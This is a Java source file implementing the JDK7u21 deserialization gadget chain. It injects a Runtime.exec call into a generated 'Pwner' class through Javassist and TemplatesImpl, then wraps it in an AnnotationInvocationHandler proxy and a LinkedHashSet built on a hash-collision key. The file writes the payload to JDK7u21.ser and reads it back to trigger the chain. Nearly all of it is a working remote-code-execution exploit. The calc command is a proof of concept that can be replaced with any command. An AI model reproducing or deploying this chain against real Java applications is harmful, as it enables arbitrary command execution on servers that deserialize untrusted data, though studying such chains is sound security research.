package com.haby0.JDK7u21;

import com.haby0.JDK7u21.util.ClassFiles;
import com.haby0.JDK7u21.util.Gadgets;
import com.haby0.JDK7u21.util.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashSet;


/**
 * Created by haby0
 */
public class JDK7u21 {

    public static void main(String[] args) throws Exception {

        TemplatesImpl templatesImpl = createTemplatesImpl("calc", TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "ssss");

        System.getProperties().put("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").
                newInstance(Templates.class, map);

        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class,1);
        allIfaces[0] = Templates.class;
        Templates templates = (Templates)Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), allIfaces, tempHandler);


        LinkedHashSet set = new LinkedHashSet();
        set.add(templatesImpl);
        set.add(templates);
        map.put(zeroHashCodeStr, templatesImpl);


        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("JDK7u21.ser")));
        oos.writeObject(set);
        oos.flush();
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("JDK7u21.ser"));
        ois.readObject();
        oos.flush();
        oos.close();
    }

    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Foo.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(Foo.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertBefore(cmd);
        clazz.setName("com.Pwner");
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();

        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
        });
        Reflections.setFieldValue(templates, "_name", "Pwner");
        return templates;
    }

    private static byte[] toByteArray(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024 * 4];
        int n = 0;
        while ((n = in.read(buffer)) != -1) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}


        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }


    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }

}
